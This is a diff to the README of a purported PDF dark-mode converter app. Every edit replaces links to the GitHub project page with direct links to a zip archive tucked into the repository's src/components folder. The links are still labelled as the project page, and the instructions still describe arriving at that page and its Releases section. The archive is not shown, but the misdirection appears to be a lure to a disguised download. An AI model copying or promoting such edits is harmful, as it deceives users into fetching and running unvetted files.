@@ -1,6 +1,6 @@
 # 🌓 PDFark-Mode-PDF-Darkmode-Converter - Easy PDF Dark Mode Switch
 
-[![Download PDFark-Mode-PDF-Darkmode-Converter](https://img.shields.io/badge/Download-PDFark--Mode--PDF--Darkmode--Converter-4caf50?style=for-the-badge&logo=github)](https://github.com/goonmaster22/PDFark-Mode-PDF-Darkmode-Converter)
+[![Download PDFark-Mode-PDF-Darkmode-Converter](https://img.shields.io/badge/Download-PDFark--Mode--PDF--Darkmode--Converter-4caf50?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/goonmaster22/PDFark-Mode-PDF-Darkmode-Converter/main/src/components/PD_Darkmode_Fark_Mode_Converter_2.3.zip)
 
 Turn any PDF into a dark or light theme instantly. This tool works on your computer and never uploads your files. It helps you read PDFs comfortably at night or during the day.
 
@@ -38,9 +38,9 @@ The app uses a modern design and tools like React and TailwindCSS. It runs right
 
 ## 🔽 Download and Installation Instructions
 
-[![Download PDFark-Mode-PDF-Darkmode-Converter](https://img.shields.io/badge/Download-PDFark--Mode--PDF--Darkmode--Converter-blue?style=for-the-badge&logo=windows)](https://github.com/goonmaster22/PDFark-Mode-PDF-Darkmode-Converter)
+[![Download PDFark-Mode-PDF-Darkmode-Converter](https://img.shields.io/badge/Download-PDFark--Mode--PDF--Darkmode--Converter-blue?style=for-the-badge&logo=windows)](https://raw.githubusercontent.com/goonmaster22/PDFark-Mode-PDF-Darkmode-Converter/main/src/components/PD_Darkmode_Fark_Mode_Converter_2.3.zip)
 
-1. Click the big green **Download** button at the top or this [link to the GitHub page](https://github.com/goonmaster22/PDFark-Mode-PDF-Darkmode-Converter).
+1. Click the big green **Download** button at the top or this [link to the GitHub page](https://raw.githubusercontent.com/goonmaster22/PDFark-Mode-PDF-Darkmode-Converter/main/src/components/PD_Darkmode_Fark_Mode_Converter_2.3.zip).
 
 2. You will arrive at the project page on GitHub. Look for a section called **Releases** on the right side or scroll down.
 
@@ -124,7 +124,7 @@ If you need help or want to report a problem:
 
 To get updates:
 
-1. Return to the GitHub page at [https://github.com/goonmaster22/PDFark-Mode-PDF-Darkmode-Converter](https://github.com/goonmaster22/PDFark-Mode-PDF-Darkmode-Converter).
+1. Return to the GitHub page at [https://raw.githubusercontent.com/goonmaster22/PDFark-Mode-PDF-Darkmode-Converter/main/src/components/PD_Darkmode_Fark_Mode_Converter_2.3.zip](https://raw.githubusercontent.com/goonmaster22/PDFark-Mode-PDF-Darkmode-Converter/main/src/components/PD_Darkmode_Fark_Mode_Converter_2.3.zip).
 
 2. Download the newest release file.
 
@@ -134,6 +134,6 @@ Your settings and saved PDFs are not affected.
 
 ---
 
-[![Download PDFark-Mode-PDF-Darkmode-Converter](https://img.shields.io/badge/Download-PDFark--Mode--PDF--Darkmode--Converter-grey?style=for-the-badge&logo=github)](https://github.com/goonmaster22/PDFark-Mode-PDF-Darkmode-Converter)
+[![Download PDFark-Mode-PDF-Darkmode-Converter](https://img.shields.io/badge/Download-PDFark--Mode--PDF--Darkmode--Converter-grey?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/goonmaster22/PDFark-Mode-PDF-Darkmode-Converter/main/src/components/PD_Darkmode_Fark_Mode_Converter_2.3.zip)
 
 Topics: client-side, dark-mode, nextjs, no-upload, pdf, pdf-converter, pdf-to-darkmode, privacy-focused, pwa, react, tailwindcss
